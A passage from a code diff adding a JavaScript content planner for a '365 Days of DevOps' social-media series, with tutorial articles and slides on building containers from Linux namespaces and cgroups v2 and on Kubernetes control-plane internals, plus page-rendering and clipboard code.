+          { tag: "FIX", title: "THE SAFE FIX: CHOWN OWNERSHIP", text: "Fix file ownership instead of blowing open permissions to everyone on the machine.", code: "chown -R deployer:webgroup /var/www\n\n// Principle of Least Privilege always wins!" }
+        ]
+      },
+      15: {
+        title: "Building Containers From Scratch with Linux Namespaces and Cgroups v2",
+        pillar: "Deep Dive / Containers",
+        hook: "There is no such thing as a container in the Linux kernel. A container is simply an ordinary process wrapped in namespaces and cgroups.",
+        captions: {
+          instagram: "There is no such thing as a container in the Linux kernel! 📦\n\nA container is simply an ordinary Linux process wrapped in two kernel primitives:\n1️⃣ Namespaces (what the process can see)\n2️⃣ Cgroups (how much resource the process can use)\n\nSwipe through for the step-by-step breakdown using unshare and cgroup controllers 👉",
+          twitter: "There is no such thing as a 'container' in Linux.\n\nIt's just an ordinary process with:\n• Namespaces (PID, NET, MNT, IPC)\n• Cgroups (CPU & Memory limits)\n\nFull breakdown in 5 slides 🧵👇",
+          short: "Containers demystified: Building an isolated container from scratch using unshare and cgroups v2! 📦"
+        },
+        hashtags: ["#Docker", "#Containers", "#Linux", "#DevOps", "#CloudNative"],
+        networking: "🎯 Daily Action: Connect with a Kubernetes or container security specialist and discuss cgroups v2 memory limits.",
+        article: "---\ntitle: \"Containers Under the Hood: Building a Container From Scratch with Linux Namespaces and Cgroups v2\"\npublished: true\ndescription: \"Demystifying Docker by creating isolated container environments from scratch using unshare, pivot_root, and cgroup resource controllers.\"\ntags: docker, linux, devops, containers\ncanonical_url: \"https://github.com/your-username/365-days-of-devops/blob/main/articles/day-015.md\"\ncover_image: \"../assets/day_015/slide_1_hook.jpg\"\n---\n\n# Containers Under the Hood: Building a Container From Scratch with Linux Namespaces and Cgroups v2\n\n> **\"There is no such thing as a 'container' in the Linux kernel. A container is simply an ordinary Linux process wrapped in namespaces for isolation and cgroups for resource metering.\"**\n\n---\n\n## 1. The Container Illusion\n\nWhen you type:\n```bash\ndocker run -d --name redis -m 512m -p 6379:6379 redis:alpine\n```\n\nIt feels like Docker boots a mini virtual machine with its own operating system kernel, network card, and isolated file tree.\n\nIn reality:\n- **No hypervisor** exists.\n- **No guest kernel** is loaded.\n- The Redis process runs directly on your host kernel’s CPU scheduler right next to your web browser and text editor.\n\nDocker is simply a friendly user-space daemon that coordinates two fundamental Linux kernel subsystems:\n1. **Linux Namespaces** (What a process can **see**).\n2. **Control Groups (cgroups)** (How much a process can **use**).\n\nIn this deep dive, we will build a production-grade isolated container environment from scratch using native Linux terminal tools—without installing Docker.\n\n---\n\n## 2. The 7 Linux Namespaces Explained\n\nNamespaces partition global system resources into isolated visual boundaries:\n\n| Namespace | Linux Flag | What It Isolates |\n|---|---|---|\n| **PID** | `CLONE_NEWPID` | Process IDs (the container gets its own PID 1) |\n| **NET** | `CLONE_NEWNET` | Network devices, routing tables, port bindings, IP addresses |\n| **MNT** | `CLONE_NEWNS` | Filesystem mount points and drive mounts |\n| **IPC** | `CLONE_NEWIPC` | Inter-process communication and shared memory segments |\n| **UTS** | `CLONE_NEWUTS` | Hostname and NIS domain name |\n| **USER** | `CLONE_NEWUSER`| User and group IDs (root inside container maps to unprivileged user on host) |\n| **CGROUP**| `CLONE_NEWCGROUP`| Visibility of cgroup hierarchy |\n\n---\n\n## 3. Hands-On: Launching an Isolated Process with `unshare`\n\nLet us create a process isolated in its own PID, UTS, and Mount namespaces:\n\n```bash\n# 1. Create a rootfs directory with Alpine mini root\nmkdir -p /tmp/mycontainer/rootfs\ncd /tmp/mycontainer\ncurl -sSL https://dl-cdn.alpinelinux.org/alpine/v3.19/releases/x86_64/alpine-minirootfs-3.19.1-x86_64.tar.gz | tar -xz -C rootfs/\n\n# 2. Enter isolated namespaces\nsudo unshare --mount --uts --ipc --net --pid --fork chroot rootfs /bin/sh\n```\n\nInside this newly launched shell:\n```bash\n/ # hostname sandbox-container\n/ # ps aux\n# Notice ps still looks at the host /proc! Let's mount an isolated proc filesystem:\n/ # mount -t proc proc /proc\n/ # ps aux\nPID   USER     TIME  COMMAND\n    1 root      0:00 /bin/sh\n    5 root      0:00 ps aux\n```\n\nYou now have an isolated environment where `/bin/sh` is **PID 1**, unable to see any other processes running on the host system!\n\n---\n\n## 4. Enforcing Hard Resource Limits with Cgroups v2\n\nNamespaces prevent a process from seeing host resources, but they do **not** prevent a rogue process from consuming 100% of the host’s RAM or CPU cores. That is the job of **cgroups**.\n\nIn Linux kernels 5.8+, **Cgroups v2** organizes resource controls under `/sys/fs/cgroup`:\n\n```bash\n# 1. Create a cgroup slice for our container\nsudo mkdir /sys/fs/cgroup/container_demo\n\n# 2. Limit memory to 256 Megabytes (268,435,456 bytes)\necho \"268435456\" | sudo tee /sys/fs/cgroup/container_demo/memory.max\n\n# 3. Limit CPU to 50% of one core (50,000 microseconds per 100,000 microsecond period)\necho \"50000 100000\" | sudo tee /sys/fs/cgroup/container_demo/cpu.max\n\n# 4. Attach our container process (PID) to this cgroup\necho \"$PID\" | sudo tee /sys/fs/cgroup/container_demo/cgroup.procs\n```\n\n### What Happens During Memory Exhaustion?\nIf the process allocates 260MB of RAM:\n1. The kernel invokes the **Out-Of-Memory (OOM) Killer**.\n2. The OOM killer evaluates processes strictly inside `container_demo`.\n3. The containerized process is terminated with `SIGKILL` (**Exit Code 137**).\n4. The host system and all neighboring applications remain completely untouched.\n\n---\n\n## 5. Why This Matters for Production Kubernetes\n\nUnderstanding these kernel primitives separates junior operators from Senior SREs:\n\n1. **Kubernetes Requests vs Limits**:\n   - `resources.requests.cpu` maps directly to `cpu.weight` in cgroups v2.\n   - `resources.limits.cpu` maps directly to `cpu.max` CFS bandwidth throttling.\n   - `resources.limits.memory` sets `memory.max`. If crossed, kernel OOM occurs immediately.\n2. **CPU Throttling Without High CPU Usage**:\n   - If your application spikes CPU within a 100ms quota period, CFS throttling kicks in, causing latency spikes even when overall 1-minute CPU averages look low (20%).\n3. **The `hostNetwork: true` Vulnerability**:\n   - Specifying `hostNetwork: true` skips network namespace isolation, allowing a container pod to bind directly to the node's local ports and sniff host traffic.\n\n---\n\n## 6. Summary Checklist\n\n- [x] Containers are isolated processes, not VMs.\n- [x] Namespaces control **visibility** (`pid`, `net`, `mnt`).\n- [x] Cgroups control **resource quotas** (`memory.max`, `cpu.max`).\n- [x] Exit Code 137 means $128 + 9$ (`SIGKILL`), almost always caused by Cgroup `memory.max` breach.\n",
+        slides: [
+          { tag: "COVER", title: "CONTAINERS UNDER THE HOOD", text: "Building an isolated container environment from scratch using native Linux kernel primitives." },
+          { tag: "NAMESPACES", title: "THE 7 LINUX NAMESPACES", text: "Namespaces isolate what a process can see across the operating system.", list: ["PID: Process IDs (own PID 1)", "NET: Network interfaces & routing", "MNT: Mount points & filesystems", "UTS: Hostname & domain isolation"] },
+          { tag: "CGROUPS", title: "CGROUPS V2 RESOURCE LIMITS", text: "Control groups restrict how much memory, CPU, and I/O a process can consume.", code: "# Limit memory to 256MB:\necho 268435456 > /sys/fs/cgroup/demo/memory.max\n\n# Attach PID:\necho $PID > /sys/fs/cgroup/demo/cgroup.procs" },
+          { tag: "K8S", title: "WHY THIS MATTERS IN K8S", text: "Understanding namespaces and cgroups explains OOMKilled (Exit 137) and CPU throttling.", list: ["resources.limits.cpu = CFS quota", "resources.limits.memory = memory.max", "Exit Code 137 = SIGKILL from OOM"] },
+          { tag: "TAKEAWAY", title: "KEY PRODUCTION LESSON", text: "Containers are not mini-VMs. They share your kernel and run directly on your host CPU scheduler.", list: ["Never run containers as root", "Drop unnecessary Linux capabilities", "Enforce read-only root filesystems"] }
+        ]
+      },
+      31: {
+        title: "Kubernetes Control Plane Internals: The Reconciliation Dance",
+        pillar: "Architecture / Kubernetes",
+        hook: "You type kubectl apply -f deployment.yaml and get back 'created'. But etcd, kube-scheduler, and the kubelet just executed a distributed reconciliation dance.",
+        captions: {
+          instagram: "What actually happens when you run kubectl apply? ☸️\n\nIt feels like a YAML interpreter, but under the hood, Kubernetes executes a choreographed distributed consensus dance:\n\n1️⃣ API Server AuthN/AuthZ\n2️⃣ Mutating & Validating Webhooks\n3️⃣ etcd Raft Quorum Write\n4️⃣ Controller Manager creates Pod objects\n5️⃣ Kube-scheduler filters & scores nodes\n6️⃣ Kubelet PLEG spawns Linux containers\n\nSwipe through for the full distributed architecture diagram 👉",
+          twitter: "When you run 'kubectl apply', 6 distributed control loops execute:\n\n• API Server AuthN/AuthZ\n• Admission Webhooks\n• etcd Raft write\n• Controller reconciliation\n• Scheduler scoring\n• Kubelet CRI/CNI spawn\n\nHere is the exact lifecycle 🧵👇",
+          short: "Kubernetes Control Plane Internals: The complete distributed dance from kubectl apply to running container! ☸️"
+        },
+        hashtags: ["#Kubernetes", "#CloudNative", "#DevOps", "#DistributedSystems", "#SRE"],
+        networking: "🎯 Daily Action: Reach out to a platform engineer or SRE discussing Kubernetes control plane latency and share notes.",
+        article: "---\ntitle: \"Kubernetes Control Plane Internals: What Actually Happens When You Run kubectl apply?\"\npublished: true\ndescription: \"A deep dive into kube-apiserver admission controllers, etcd Raft consensus, kube-scheduler scoring, and kubelet PLEG container lifecycles.\"\ntags: kubernetes, devops, cloud, architecture\ncanonical_url: \"https://github.com/your-username/365-days-of-devops/blob/main/articles/day-031.md\"\ncover_image: \"../assets/day_031/slide_1_hook.jpg\"\n---\n\n# Kubernetes Control Plane Internals: What Actually Happens When You Run `kubectl apply`?\n\n> **\"You type `kubectl apply -f deployment.yaml` and get back `deployment.apps/web created`. But etcd, kube-scheduler, and the kubelet just executed a distributed reconciliation dance across multiple cluster nodes.\"**\n\n---\n\n## 1. Introduction: Beyond the YAML Abstraction\n\nTo most developers, Kubernetes appears to be a declarative YAML interpreter. You submit a desired state, and within seconds, containers start serving traffic on port 8080.\n\nHowever, when an outage strikes:\n- Why is a Pod stuck in `Pending` when nodes appear to have available RAM?\n- Why did an etcd leader election timeout trigger cascading node heartbeat failures?\n- Why does the API server throw `HTTP 409 Conflict: Operation cannot be fulfilled on deployments.apps: the object has been modified`?\n\nTo debug production clusters at scale, you must understand the distributed architecture of the **Kubernetes Control Plane**.\n\n```text\nThe Kubernetes Control Plane Architecture:\n┌─────────────────────────────────────────────────────────────┐\n│                       CONTROL PLANE                         │\n│                                                             │\n│   [kubectl] ──► [kube-apiserver] ◄──► [etcd (Raft DB)]      │\n│                        │                                    │\n│       ┌────────────────┼────────────────┐                   │\n│       ▼                ▼                ▼                   │\n│ [kube-scheduler] [controller-mgr] [cloud-controller-mgr]   │\n└───────┬─────────────────────────────────────────────────────┘\n        │\n        │ Watch / Heartbeat via TLS\n        ▼\n┌─────────────────────────────────────────────────────────────┐\n│                        WORKER NODE                          │\n│                                                             │\n│   [kubelet] ◄──► [containerd / CRI] ──► [Linux Pods]        │\n│        ▲                                                    │\n│   [kube-proxy] (iptables / IPVS rules)                      │\n└─────────────────────────────────────────────────────────────┘\n```\n\n---\n\n## 2. Step 1: Client-Side Authentication & The API Server Gateway\n\nWhen you execute `kubectl apply`:\n1. **Client Parsing**: `kubectl` validates the YAML schema locally against OpenAPI specifications.\n2. **TLS Handshake**: `kubectl` initiates an HTTPS connection to `kube-apiserver` (port 6443) using client certificates, bearer tokens, or OpenID Connect (OIDC).\n3. **Authentication (Who are you?)**: `apiserver` authenticates the request via Webhook, X.509 certs, or token reviews.\n4. **Authorization (What can you do?)**: Role-Based Access Control (**RBAC**) checks whether the user has `create` verb permission on `deployments` in the target namespace.\n\n---\n\n## 3. Step 2: Admission Controllers (Mutating & Validating)\n\nBefore anything is committed to persistent storage, the request passes through two admission phases:\n\n### Mutating Admission Controllers\nModifies the object before persistence:\n- Injects default values (e.g., setting `imagePullPolicy: IfNotPresent`).\n- Istio / Linkerd sidecar injectors add proxy containers and volume mounts to the Pod spec.\n\n### Validating Admission Controllers\nEnforces security constraints and organizational policies:\n- Gatekeeper (OPA) or Kyverno checks: Does this container run as root? Are CPU limits defined? Is the image sourced from an approved enterprise container registry?\n- If validation fails, the API server rejects the request immediately with an error.\n\n---\n\n## 4. Step 3: Persistence in `etcd` via Raft Consensus\n\nOnce validated, `kube-apiserver` serializes the JSON representation of the Deployment into **etcd**, the distributed key-value store.\n- `kube-apiserver` is the **only** component in the entire cluster that communicates with `etcd`.\n- etcd uses the **Raft consensus algorithm**. The write is only confirmed once a quorum of etcd members ($N/2 + 1$) persist the log entry to write-ahead disk (WAL).\n- etcd records the object's `metadata.resourceVersion` to enable optimistic concurrency control.\n\n---\n\n## 5. Step 4: The Controller Manager Reconciliation Loop\n\nThe `kube-controller-manager` runs dozens of decoupled control loops:\n1. **Deployment Controller**:\n   - Watches `kube-apiserver` for new or updated `Deployment` objects.\n   - Observes that a Deployment exists with `replicas: 3`, but no matching `ReplicaSet` exists.\n   - Creates a `ReplicaSet` object via the API server.\n2. **ReplicaSet Controller**:\n   - Watches for `ReplicaSet` changes.\n   - Observes that 3 Pods are desired, but 0 currently exist.\n   - Generates 3 unbound `Pod` objects with `spec.nodeName: \"\"` (unscheduled).\n\n---\n\n## 6. Step 5: `kube-scheduler`: The Placement Decision\n\nThe `kube-scheduler` watches for Pods where `nodeName` is empty. It assigns each Pod to the optimal worker node in two distinct phases:\n\n### 1. Filtering (Predicates)\nDisqualifies nodes that cannot run the Pod:\n- `NodeResourcesFit`: Does the node have sufficient unallocated CPU and RAM requests?\n- `NodeName` & `NodeSelector`: Do node labels match?\n- `Tolerations`: Does the Pod tolerate the node's taints?\n\n### 2. Scoring (Priorities)\nRanks surviving candidate nodes on a scale of 0–100:\n- `ImageLocality`: Nodes with the container image already cached receive higher scores.\n- `PodTopologySpread`: Spreads Pods evenly across failure zones (e.g. AWS availability zones `us-east-1a`, `us-east-1b`).\n- The node with the highest score is selected. The scheduler executes a **Binding** API call setting `spec.nodeName = \"worker-node-03\"`.\n\n---\n\n## 7. Step 6: `kubelet` Execution & The PLEG Loop\n\nOn the designated worker node:\n1. The **`kubelet`** daemon has an active HTTP/2 Watch stream open to the API server.\n2. It discovers that a Pod has been scheduled to its node.\n3. **CRI (Container Runtime Interface)**: The kubelet sends gRPC calls to the local runtime (e.g. `containerd` or `CRI-O`):\n   - Pulls container image from container registry.\n   - Calls **CNI (Container Network Interface)** plugin (e.g., Cilium, Calico) to allocate an IP address and configure veth network interfaces.\n   - Creates cgroups and namespaces via `runc`.\n4. **PLEG (Pod Lifecycle Event Generator)**:\n   - Polls the container runtime periodically to detect container state transitions (`ContainerStarted`, `ContainerDied`).\n   - Reports Pod status (`Running`, `IP: 10.244.1.45`) back to `kube-apiserver`.\n\n---\n\n## 8. Summary: The 7-Step Lifecycle Cheat Sheet\n\n```text\n1. kubectl apply ──► 2. kube-apiserver (AuthN/AuthZ)\n                          │\n                     3. Mutating & Validating Webhooks\n                          │\n                     4. etcd Raft Quorum Write\n                          │\n                     5. Controller Manager creates Pods\n                          │\n                     6. kube-scheduler binds Pod to Node\n                          │\n                     7. kubelet + containerd starts Linux cgroups & veth\n```\n\nUnderstanding this flow allows you to isolate any cluster failure in seconds:\n- If Pod is `Pending` with no events ➔ Check `kube-scheduler`.\n- If Pod is stuck terminating ➔ Check `kubelet` PLEG or finalizers.\n- If mutations are ignored ➔ Check Validating/Mutating Webhooks timeout.\n",
+        slides: [
+          { tag: "COVER", title: "KUBERNETES CONTROL PLANE INTERNALS", text: "The distributed reconciliation dance executed across etcd, scheduler, and worker kubelets." },
+          { tag: "APISERVER", title: "1. AUTH & ADMISSION CONTROLLERS", text: "Authentication, RBAC authorization, and mutating/validating webhook validation.", list: ["TLS Handshake on port 6443", "RBAC verb verification", "Mutating injectors & OPA validation"] },
+          { tag: "ETCD", title: "2. ETCD RAFT QUORUM PERSISTENCE", text: "The API server is the only component that writes to etcd. Writes require N/2+1 quorum.", code: "// Optimistic concurrency control:\nmetadata.resourceVersion = 104523\n// Prevents concurrent overwrites" },
+          { tag: "SCHEDULING", title: "3. KUBE-SCHEDULER FILTER & SCORE", text: "Selects the optimal node using two sequential algorithms:", list: ["Filtering: NodeResourcesFit & taints", "Scoring: ImageLocality & topology spread", "Binds nodeName to Pod spec"] },
+          { tag: "EXECUTION", title: "4. KUBELET & PLEG CONTAINER SPAWN", text: "Worker node kubelet receives watch event and coordinates CRI and CNI plugins.", list: ["CRI: containerd spawns cgroups", "CNI: Cilium allocates Pod IP", "PLEG: reports status Running"] }
+        ]
+      }
+    };
+
+    function getDayData(dayNum) {
+      if (SPECIAL_DAYS[dayNum]) {
+        return SPECIAL_DAYS[dayNum];
+      }
+
+      let phase = FOLDER_TREE.find(p => dayNum >= p.range[0] && dayNum <= p.range[1]);
+      let dayPadded = String(dayNum).padStart(3, '0');
+      let domainName = phase.folderName.replace(/^\d+_/, '').replace(/_/g, ' ');
+      let title = `Day ${dayPadded}: Production Architecture in ${domainName}`;
+
+      let hook = `Understanding the architectural trade-offs of ${phase.displayName.split(':')[1] || domainName} is what separates fragile prototypes from resilient production systems.`;
+
+      return {
+        title: title,
+        pillar: "Teach / Engineering",
+        hook: hook,
+        captions: {
+          instagram: `Day ${dayNum} of 365 🚀\n\nDeep diving into ${domainName} in modern cloud infrastructure.\n\n${hook}\n\nSwipe through the 5-slide carousel for the core architecture patterns, failure modes, and production configuration guidelines 👉\n\nKey Takeaways:\n1️⃣ The Architectural Problem & Scalability Bottlenecks\n2️⃣ Core Technical Mechanics & Invariants\n3️⃣ Production Configuration & Best Practices\n\nSave this cheat sheet for your DevOps portfolio 📌`,
+          twitter: `Day ${dayPadded}: Production Architecture in ${domainName} 🧵\n\nNaive implementations fail under traffic. Resilient systems rely on strict invariants:\n\n• Enforce resource limits & bounds\n• Level-triggered reconciliation\n• Circuit breakers & graceful degradation\n\nFull visual breakdown in 5 slides 👇`,
+          short: `Day ${dayPadded}: ${domainName} demystified! Swipe through for the 5-slide production architectural breakdown 👉`
+        },
+        hashtags: ["#DevOps", "#CloudArchitecture", "#Kubernetes", "#Terraform", "#SRE", "#PlatformEngineering"],
+        networking: `🎯 Daily Action: Reach out to a peer engineer working in ${domainName} and exchange notes on your biggest production challenge.`,
+        slides: [
+          { tag: "ARCHITECTURE", title: `${domainName.toUpperCase()} ARCHITECTURE & SPEC`, text: `Production patterns, system trade-offs, and implementation mechanics in enterprise cloud engineering.` },
+          { tag: "SYSTEMS", title: "THE ARCHITECTURAL PROBLEM", text: `Why naive implementations fail at scale and the system invariants required to maintain 99.99% availability.`, list: ["Scalability bottleneck", "Failure domains", "State synchronization"] },
+          { tag: "DEEP DIVE", title: "CORE TECHNICAL MECHANICS", text: `How the underlying components interact during high-throughput execution:`, code: `// Production invariant definition:\nconst INVARIANTS = {\n  domain: "${domainName}",\n  resilience: "level-triggered",\n  sla: "99.99%"\n};` },
+          { tag: "PRODUCTION", title: "PRODUCTION CONFIGURATION & RULES", text: `Sanitized configuration guidelines tested under heavy traffic conditions.`, list: ["Enforce resource limits", "Implement circuit breakers", "Automate telemetry alerts"] },
+          { tag: "TAKEAWAY", title: "STAFF-LEVEL TAKEAWAYS", text: `Focus on mean-time-to-recovery (MTTR), observability, and blameless operational hygiene.`, list: ["Document architectural decisions", "Verify before deploying to prod", "Share knowledge with your team"] }
+        ]
+      };
+    }
+
+    let currentDay = 4;
+    let activePlatform = 'instagram';
+    let collapsedFolders = new Set();
+
+    function initFolderState() {
+      FOLDER_TREE.forEach(phase => {
+        if (currentDay < phase.range[0] || currentDay > phase.range[1]) {
+          collapsedFolders.add(phase.id);
+        }
+        phase.subfolders.forEach(sub => {
+          if (currentDay < sub.range[0] || currentDay > sub.range[1]) {
+            collapsedFolders.add(sub.id);
+          }
+        });
+      });
+    }
+
+    function toggleFolder(folderId, e) {
+      if (e) e.stopPropagation();
+      if (collapsedFolders.has(folderId)) {
+        collapsedFolders.delete(folderId);
+      } else {
+        collapsedFolders.add(folderId);
+      }
+      renderDayList();
+    }
+
+    function renderDayList() {
+      const container = document.getElementById('dayListContainer');
+      container.innerHTML = '';
+      const filter = document.getElementById('searchInput').value.toLowerCase();
+
+      FOLDER_TREE.forEach(phase => {
+        let phaseMatches = [];
+
+        for (let i = phase.range[0]; i <= phase.range[1]; i++) {
+          const data = getDayData(i);
+          if (!filter || data.title.toLowerCase().includes(filter) || String(i).includes(filter)) {
+            phaseMatches.push({ day: i, data: data });
+          }
+        }
+
+        if (filter && phaseMatches.length === 0) return;
+
+        const isPhaseCollapsed = collapsedFolders.has(phase.id) && !filter;
+
+        const phaseEl = document.createElement('div');
+        phaseEl.className = `phase-folder ${isPhaseCollapsed ? 'collapsed' : ''} ${currentDay >= phase.range[0] && currentDay <= phase.range[1] ? 'active-phase' : ''}`;
+
+        phaseEl.innerHTML = `
+          <div class="phase-header" onclick="toggleFolder('${phase.id}', event)">
+            <div class="phase-title-left">
+              <span class="folder-arrow">▼</span>
+              <span>📁 ${phase.folderName}</span>
+            </div>
+            <span class="folder-badge">${phase.range[1] - phase.range[0] + 1}d</span>
+          </div>
+          <div class="phase-content" id="content_${phase.id}"></div>
+        `;
+
+        const phaseContent = phaseEl.querySelector(`#content_${phase.id}`);
+
+        phase.subfolders.forEach(sub => {
+          let subMatches = phaseMatches.filter(m => m.day >= sub.range[0] && m.day <= sub.range[1]);
+          if (filter && subMatches.length === 0) return;
+
+          const isSubCollapsed = collapsedFolders.has(sub.id) && !filter;
+
+          const subEl = document.createElement('div');
+          subEl.className = `sub-folder ${isSubCollapsed ? 'collapsed' : ''}`;
+          subEl.innerHTML = `
+            <div class="sub-folder-header" onclick="toggleFolder('${sub.id}', event)">
+              <div style="display: flex; align-items: center; gap: 6px;">
+                <span class="folder-arrow">▼</span>
+                <span>📂 ${sub.name}</span>
+              </div>
+              <span style="font-size: 9px; font-family: 'Fira Code', monospace; color: #64748B;">${sub.range[1] - sub.range[0] + 1}</span>
+            </div>
+            <div class="sub-content" id="sub_${sub.id}"></div>
+          `;
+
+          const subContent = subEl.querySelector(`#sub_${sub.id}`);
+
+          subMatches.forEach(({ day, data }) => {
+            const dayPadded = String(day).padStart(3, '0');
+            const item = document.createElement('div');
+            item.className = `day-item ${day === currentDay ? 'active' : ''}`;
+            item.innerHTML = `
+              <div class="day-item-header">
+                <span>📄 DAY ${dayPadded}</span>
+                <span style="color: var(--accent-cyan); font-weight: bold;">${data.pillar.split('/')[0].trim()}</span>
+              </div>
+              <div class="day-item-title">${data.title}</div>
+            `;
+            item.onclick = (e) => {
+              e.stopPropagation();
+              selectDay(day);
+            };
+            subContent.appendChild(item);
+          });
+
+          phaseContent.appendChild(subEl);
+        });
+
+        container.appendChild(phaseEl);
+      });
+    }
+
+    function switchPlatformTab(platform) {
+      activePlatform = platform;
+      document.getElementById('tabInstagramBtn').className = `platform-tab-btn ${platform === 'instagram' ? 'active' : ''}`;
+      document.getElementById('tabTwitterBtn').className = `platform-tab-btn ${platform === 'twitter' ? 'active' : ''}`;
+      document.getElementById('tabShortBtn').className = `platform-tab-btn ${platform === 'short' ? 'active' : ''}`;
+
+      const data = getDayData(currentDay);
+      updateCaptionView(data);
+    }
+
+    function updateCaptionView(data) {
+      let captionText = data.captions[activePlatform] || data.captions['instagram'];
+      const textarea = document.getElementById('captionTextarea');
+      textarea.value = captionText + '\n\n' + data.hashtags.join(' ');
+
+      const label = document.getElementById('captionPlatformLabel');
+      if (activePlatform === 'instagram') {
+        label.innerText = 'Platform: Instagram / Threads (Carousel Focus + Emojis)';
+      } else if (activePlatform === 'twitter') {
+        label.innerText = 'Platform: X / Twitter Thread Starter (280-char focus)';
+      } else {
+        label.innerText = 'Platform: Quick Punchy Hook (Short-form)';
+      }
+
+      updateCharCounts();
+    }
+
+    function updateCharCounts() {
+      const capVal = document.getElementById('captionTextarea').value;
+      const capWords = capVal.trim() ? capVal.trim().split(/\s+/).length : 0;
+      document.getElementById('captionCharCount').innerText = `${capVal.length} chars • ${capWords} words`;
+
+      const postVal = document.getElementById('postTextPreview').value;
+      document.getElementById('postCharCount').innerText = `${postVal.length} chars`;
+    }
+
+    document.getElementById('captionTextarea').oninput = updateCharCounts;
+    document.getElementById('postTextPreview').oninput = updateCharCounts;
+
+    function selectDay(dayNum) {
+      currentDay = dayNum;
+      const data = getDayData(dayNum);
+      const dayPadded = String(dayNum).padStart(3, '0');
+
+      let phase = FOLDER_TREE.find(p => dayNum >= p.range[0] && dayNum <= p.range[1]);
+      if (phase) {
+        collapsedFolders.delete(phase.id);
+        phase.subfolders.forEach(s => {
+          if (dayNum >= s.range[0] && dayNum <= s.range[1]) {
+            collapsedFolders.delete(s.id);
+          }
+        });
+      }
+
+      document.getElementById('dateBadge').innerText = `Day ${dayPadded}`;
+      document.getElementById('phaseBadge').innerText = phase ? phase.displayName.split(':')[0] : 'Phase';
+      document.getElementById('pillarBadge').innerText = data.pillar;
+      document.getElementById('dayTitle').innerText = data.title;
+      document.getElementById('dayHook').innerText = `"${data.hook}"`;
+
+      // Render 5 Slides with Rich Terminal & Glassmorphism Cards
+      const slidesContainer = document.getElementById('slidesContainer');
+      slidesContainer.innerHTML = '';
+
+      data.slides.forEach((slide, idx) => {
+        const wrapper = document.createElement('div');
+        wrapper.className = 'slide-wrapper';
+
+        let bodyContent = '';
+        if (slide.code) {
+          bodyContent += `
+            <div class="slide-terminal">
+              <div class="terminal-bar">
+                <div class="terminal-dot dot-red"></div>
+                <div class="terminal-dot dot-yellow"></div>
+                <div class="terminal-dot dot-green"></div>
+                <span class="terminal-title">spec.sh — zsh</span>
+              </div>
+              <div class="terminal-content">${escapeHtml(slide.code)}</div>
+            </div>
+          `;
+        }
+        if (slide.text) {
+          bodyContent += `<div class="slide-text">${slide.text}</div>`;
+        }
+        if (slide.list && slide.list.length > 0) {
+          bodyContent += `
+            <div class="slide-list">
+              ${slide.list.map(li => `<div class="slide-list-item">${li}</div>`).join('')}
+            </div>
+          `;
+        }
+
+        wrapper.innerHTML = `
+          <div class="slide-card" id="slideCard_${idx}">
+            <div class="slide-header">
+              <span class="slide-tag">⚡ ${slide.tag}</span>
+              <span class="slide-num-badge">SLIDE ${idx + 1} / 5</span>
+            </div>
+            <div class="slide-body">
+              <div class="slide-title">${slide.title}</div>
+              ${bodyContent}
+            </div>
+            <div class="slide-footer">
+              <span class="slide-footer-brand">⚡ SYSTEMS ARCHITECTURE</span>
+              <span>Production Spec • Swipe →</span>
+            </div>
+          </div>
+          <button class="slide-download-btn" onclick="downloadSlideCanvas(${idx})">⬇ Download 1080p Slide ${idx + 1} (PNG)</button>
+        `;
+        slidesContainer.appendChild(wrapper);
+      });
+
+      updateCaptionView(data);
+
+      document.getElementById('hashtagsContainer').innerHTML = data.hashtags.map(tag => `<span class="hashtag-pill" onclick="copySingleTag('${tag}')">${tag}</span>`).join('');
+      document.getElementById('networkingPreview').innerText = data.networking;
+      document.getElementById('postTextPreview').value = generatePostText(dayNum, data);
+
+      updateCharCounts();
+      updateArticleView(data, dayNum);
+      renderDayList();
+    }
+
+    function generatePostText(dayNum, data) {
+      return `${data.hook}\n\nHere is the technical breakdown for Day ${dayNum} of 365 Days of DevOps & Cloud Infrastructure:\n\n` +
+        data.slides.map((s, idx) => `${idx + 1}️⃣ ${s.title}\n${s.text || ''}\n${s.list ? s.list.map(l => '  • ' + l).join('\n') : ''}`).join('\n\n') +
+        `\n\nWhat would you add from your experience?\n\n` +
+        data.hashtags.join(' ');
+    }
+
+    function escapeHtml(text) {
+      return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    }
+
+    function showToast(msg) {
+      const toast = document.getElementById('toastMsg');
+      toast.innerText = msg;
+      toast.classList.add('show');
+      setTimeout(() => toast.classList.remove('show'), 2200);
+    }
+
+    function copyToClipboard(text, msg) {
+      navigator.clipboard.writeText(text);
+      showToast(msg);
+    }
+
+    function copySingleTag(tag) {
+      copyToClipboard(tag, `Tag ${tag} copied!`);
+    }
+
+    document.getElementById('copyHashtagsBtn').onclick = () => {
+      const data = getDayData(currentDay);
+      copyToClipboard(data.hashtags.join(' '), 'All hashtags copied!');
+    };
+
+    document.getElementById('prevBtn').onclick = () => { if (currentDay > 1) selectDay(currentDay - 1); };
+    document.getElementById('nextBtn').onclick = () => { if (currentDay < 365) selectDay(currentDay + 1); };
+    document.getElementById('searchInput').oninput = renderDayList;
+
+    document.getElementById('expandAllBtn').onclick = () => {
+      collapsedFolders.clear();
+      renderDayList();
+    };
+
+    document.getElementById('collapseAllBtn').onclick = () => {
+      FOLDER_TREE.forEach(p => {
+        collapsedFolders.add(p.id);
+        p.subfolders.forEach(s => collapsedFolders.add(s.id));
+      });
+      renderDayList();
+    };
+
+    document.getElementById('copyCaptionHeaderBtn').onclick = () => {
+      copyToClipboard(document.getElementById('captionTextarea').value, `Day ${currentDay} Caption copied!`);
+    };
+
+    document.getElementById('quickCopyCaptionBtn').onclick = () => {
+      copyToClipboard(document.getElementById('captionTextarea').value, `Day ${currentDay} Caption copied!`);
+    };
+
+    document.getElementById('copyCaptionBoxBtn').onclick = () => {
+      copyToClipboard(document.getElementById('captionTextarea').value, `Caption copied to clipboard!`);
+    };
+
+    document.getElementById('copyPostBtn').onclick = () => {
+      copyToClipboard(document.getElementById('postTextPreview').value, `Day ${currentDay} LinkedIn Post copied!`);
+    };
+
+    document.getElementById('copyPostTextBtn').onclick = () => {
+      copyToClipboard(document.getElementById('postTextPreview').value, `LinkedIn Post copied!`);
+    };
+
+    // Article Event Listeners
+    document.getElementById('copyArticleBtn').onclick = () => {
+      copyToClipboard(document.getElementById('articleTextarea').value, `Day ${currentDay} Technical Article (.md) copied!`);
+    };
+    document.getElementById('copyArticleHeaderBtn').onclick = () => {
+      copyToClipboard(document.getElementById('articleTextarea').value, `Day ${currentDay} Technical Article (.md) copied!`);
+    };
+    document.getElementById('copyArticleDayBtn').onclick = () => {
